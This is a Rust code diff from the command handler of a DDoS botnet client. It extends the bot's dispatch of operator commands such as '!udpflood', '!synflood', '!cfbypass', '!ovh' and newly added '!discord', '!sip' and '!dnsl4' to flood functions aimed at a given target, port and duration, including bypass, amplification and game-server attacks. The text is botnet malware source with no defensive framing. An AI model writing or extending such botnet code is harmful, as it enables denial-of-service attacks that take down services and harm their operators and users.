@@ -326,11 +326,12 @@ async fn handle_command(command: &str, state: Arc<BotState>) -> Result<()> {
     // Attack commands
     match cmd {
         "!udpflood" | "!udpsmart" | "!tcpflood" | "!synflood" | 
-        "!ackflood" | "!greflood" | "!dns" | "!http" |
+        "!ackflood" | "!greflood" | "!dns" | "!dnsl4" | "!http" |
         "!slowloris" | "!sslflood" | "!websocket" | "!icmpflood" |
         "!amplification" | "!connection" |
         "!vse" | "!ovh" | "!cfbypass" | "!stress" |
-        "!minecraft" | "!raknet" | "!fivem" | "!ts3" | "!udpmax" => {
+        "!minecraft" | "!raknet" | "!fivem" | "!ts3" | "!udpmax" |
+        "!discord" | "!sip" => {
             handle_attack_command(cmd, &fields, state).await?;
         }
         
@@ -425,12 +426,12 @@ async fn handle_v2_attack_command(fields: &[&str], state: Arc<BotState>) -> Resu
         let start = Instant::now();
         
         let result: Result<(), Box<dyn std::error::Error + Send + Sync>> = match method_clone.as_str() {
-            "UDP" => { attack_methods::udp_flood(&target, port, duration).await; Ok(()) },
+            "UDP" | "STD" => { attack_methods::udp_flood(&target, port, duration).await; Ok(()) },
             "TCP" => { attack_methods::tcp_flood(&target, port, duration).await; Ok(()) },
             "SYN" => { attack_methods::syn_flood(&target, port, duration).await; Ok(()) },
             "ACK" => { attack_methods::ack_flood(&target, port, duration).await; Ok(()) },
             "VSE" => { attack_methods::vse_flood(&target, port, duration).await; Ok(()) },
-            "OVH" => { attack_methods::ovh_flood(&target, port, duration).await; Ok(()) },
+            "OVH" | "NFO" | "BYPASS" => { attack_methods::ovh_flood(&target, port, duration).await; Ok(()) },
             "HTTP" => { attack_methods::http_flood(&target, port, duration).await; Ok(()) },
             "CFBYPASS" | "CF" => { attack_methods::cf_bypass_flood(&target, port, duration).await; Ok(()) },
             "SLOWLORIS" => { attack_methods::slowloris(&target, port, duration).await; Ok(()) },
@@ -439,8 +440,18 @@ async fn handle_v2_attack_command(fields: &[&str], state: Arc<BotState>) -> Resu
             "RAKNET" => { attack_methods::raknet_flood(&target, port, duration).await; Ok(()) },
             "FIVEM" => { attack_methods::fivem_flood(&target, port, duration).await; Ok(()) },
             "TS3" => { attack_methods::ts3_flood(&target, port, duration).await; Ok(()) },
+            "DISCORD" => { attack_methods::discord_flood(&target, port, duration).await; Ok(()) },
+            "SIP" => { attack_methods::sip_flood(&target, port, duration).await; Ok(()) },
             "TLS" | "SSL" => { attack_methods::ssl_flood(&target, port, duration).await; Ok(()) },
             "DNS" => { attack_methods::dns_flood(&target, port, duration).await; Ok(()) },
+            "DNSL4" => { attack_methods::dns_flood_l4(&target, port, duration).await; Ok(()) },
+            "UDPMAX" => { attack_methods::udp_max_flood(&target, port, duration).await; Ok(()) },
+            "UDPSMART" => { attack_methods::udp_smart(&target, port, duration).await; Ok(()) },
+            "ICMP" => { attack_methods::icmp_flood(&target, duration).await; Ok(()) },
+            "GRE" => { attack_methods::gre_flood(&target, duration).await; Ok(()) },
+            "AMPLIFICATION" | "AMP" => { attack_methods::amplification_attack(&target, port, duration).await; Ok(()) },
+            "CONNECTION" | "TCPCONN" => { attack_methods::connection_exhaustion(&target, port, duration).await; Ok(()) },
+            "WEBSOCKET" | "WS" => { attack_methods::websocket_flood(&target, port, duration).await; Ok(()) },
             _ => {
                 tracing::warn!("Unknown V2 attack method: {}", method_clone);
                 Ok(())
@@ -562,6 +573,10 @@ async fn handle_attack_command(cmd: &str, fields: &[&str], state: Arc<BotState>)
                 attack_methods::dns_flood(&target, port, duration).await;
                 Ok(())
             }
+            "!dnsl4" => {
+                attack_methods::dns_flood_l4(&target, port, duration).await;
+                Ok(())
+            }
             "!http" => {
                 attack_methods::http_flood(&target, port, duration).await;
                 Ok(())
@@ -620,6 +635,14 @@ async fn handle_attack_command(cmd: &str, fields: &[&str], state: Arc<BotState>)
             }
             "!ts3" => {
                 attack_methods::ts3_flood(&target, port, duration).await;
+                Ok(())
+            }
+            "!discord" => {
+                attack_methods::discord_flood(&target, port, duration).await;
+                Ok(())
+            }
+            "!sip" => {
+                attack_methods::sip_flood(&target, port, duration).await;
                 Ok(())
             }
             _ => {
